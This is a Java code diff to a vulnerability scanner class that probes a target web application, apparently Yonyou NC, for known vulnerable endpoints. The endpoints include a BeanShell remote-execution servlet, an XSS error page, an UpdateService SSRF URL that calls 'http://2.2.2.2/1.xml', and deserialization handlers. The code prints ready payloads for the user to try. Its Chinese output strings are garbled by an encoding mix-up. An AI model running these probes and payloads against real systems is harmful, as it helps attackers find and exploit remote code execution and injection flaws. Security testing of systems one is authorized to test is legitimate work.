@@ -14,7 +14,7 @@ public class Dirsearch {
 	public String url;
 	public Dirsearch(String url) throws Exception {
 		this.url = url;
-		System.out.println("æ£€æµ‹å¼€å§‹");
+		System.out.println("¼ì²â¿ªÊ¼");
 		String[] servlet = {
 				"MonitorServlet",
 				"MxServlet",
@@ -24,15 +24,19 @@ public class Dirsearch {
 				"UploadServlet",
 				"DeleteServlet",
 				"ActionHandlerServlet",
-				"ServiceDispatcherServlet"
+				"NCMessageServlet",
+				"ServiceDispatcherServlet",
+				"BshServlet",
+				"ShowAlertFileServlet",
+				"errorXSS",
+				"UpdateService",
+				"IPreAlertConfigService",
+				"jsinvoke",
 				};
 		for (int i = 0; i < servlet.length; i++) {
 			curltest(Expliot.getServleturl(servlet[i]), servlet[i]);
 		}
-		curltest("servlet/~ic/bsh.servlet.BshServlet","BshServlet");
-		curltest("servlet/~ic/ShowAlertFileServlet","ShowAlertFileServlet");
-		curltest("uapws/pages/error.jsp?msg=<img%20src=1>","errorXSS");
-		System.out.println("æ£€æµ‹å®Œæ¯•");
+		System.out.println("¼ì²âÍê±Ï");
 	}
 	
 
@@ -41,7 +45,8 @@ public class Dirsearch {
 		try {
 			curlexec(Servlet, Servletname);
 		} catch (Exception e) {
-			System.out.println("è®¿é—®"+Servletname+"å¤±è´¥ï¼Œè¯·æ£€æµ‹ç½‘ç»œï¼Œæˆ–è€…å­˜åœ¨waf");
+			System.out.println(e);
+			System.out.println("·ÃÎÊ"+Servletname+"Ê§°Ü£¬Çë¼ì²âÍøÂç£¬»òÕß´æÔÚwaf");
 		}
 		
 	}
@@ -55,6 +60,7 @@ public class Dirsearch {
         };
         HttpsURLConnection.setDefaultHostnameVerifier(hv);
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        
         if (Servletname.equals("ServiceDispatcherServlet")){
         	connection.setRequestMethod("POST");
         } else {
@@ -64,29 +70,52 @@ public class Dirsearch {
         connection.setConnectTimeout(10000);
         connection.setReadTimeout(10000);
         connection.connect();
+        InputStream is;
+        try {
+        	is = (InputStream) connection.getInputStream();
+		} catch (Exception e) {
+			is = connection.getErrorStream();
+		}
+		BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
+        StringBuffer sbf = new StringBuffer();
+        String temp = null;
+        while ((temp = br.readLine()) != null) {
+            sbf.append(temp);
+        }
+        
+        
         if (connection.getResponseCode() == 200 | connection.getResponseCode() == 302 ) {
-            InputStream is = (InputStream) connection.getInputStream();
-            BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
-            StringBuffer sbf = new StringBuffer();
-            String temp = null;
-            while ((temp = br.readLine()) != null) {
-                sbf.append(temp);
-            }
-        	if (Servletname.equals("BshServlet")) {
-        		System.out.println("å­˜åœ¨ BshServlet è¯·è®¿é—® "+this.url+Servlet);
-			} else if (Servletname.equals("ShowAlertFileServlet")) {
-				System.out.println("å­˜åœ¨ ShowAlertFileServlet 302è·³è½¬ä¸º  "+connection.getHeaderField("Location"));
-			} else if (Servletname.equals("errorXSS")) {
+
+            
+            switch (Servletname) {
+            
+			case "BshServlet":
+				System.out.println("´æÔÚ BshServlet Çë·ÃÎÊ "+this.url+Servlet);
+				break;
+			case "ShowAlertFileServlet":
+				System.out.println("´æÔÚ ShowAlertFileServlet 302Ìø×ªÎª  "+connection.getHeaderField("Location"));
+				break;
+			case "errorXSS":
 				if (sbf.indexOf("<img src=1>")!=-1) {
-					System.out.println("å­˜åœ¨ errorXSS è¯·è®¿é—®"+this.url+"uapws/pages/error.jsp?msg=<script>alert(1)</script>");
+					System.out.println("´æÔÚ errorXSS Çë·ÃÎÊ"+this.url+"uapws/pages/error.jsp?msg=<script>alert(1)</script>");
 				} else {
-					System.out.println("ä¸å­˜åœ¨ "+Servletname);
+					System.out.println("²»´æÔÚ "+Servletname);
 				}
-			} else {
-				System.out.println("å­˜åœ¨ "+Servletname);
+				break;
+			case "UpdateService":
+				System.out.println("´æÔÚ UpdateService Çë·ÃÎÊ "+this.url+"uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://2.2.2.2/1.xml");
+				break;
+			case "IPreAlertConfigService":
+				System.out.println("´æÔÚ IPreAlertConfigService Çë·ÃÎÊ "+this.url+Servlet);
+				break;
+			default:
+				System.out.println("´æÔÚ "+Servletname);
+				break;
 			}
-        } else {
-        	System.out.println("ä¸å­˜åœ¨ "+Servletname);
+        } else if (connection.getResponseCode() == 500  && (sbf.indexOf("java.io.ObjectInputStream.readStreamHeader")!=-1 || sbf.indexOf("nc.bs.framework.js.command.InvokeCommand.execute")!=-1  )) {
+        	System.out.println("´æÔÚ "+Servletname);
+		} else {
+        	System.out.println("²»´æÔÚ "+Servletname);
         }
 	}
 	
